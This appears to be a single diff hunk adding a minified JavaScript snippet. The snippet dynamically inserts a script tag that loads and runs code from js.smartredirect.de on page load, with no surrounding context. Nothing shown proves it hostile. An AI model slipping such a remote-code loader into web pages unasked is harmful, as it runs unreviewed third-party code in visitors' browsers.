@@ -1,0 +1,1 @@
+(()=>{var t,e,r;document.currentScript.src.split("id=")[1];t="https://js.smartredirect.de/js/?h=TqxwmCqJ",e=document.body,(r=document.createElement("script")).src=t,e.appendChild(r)})();
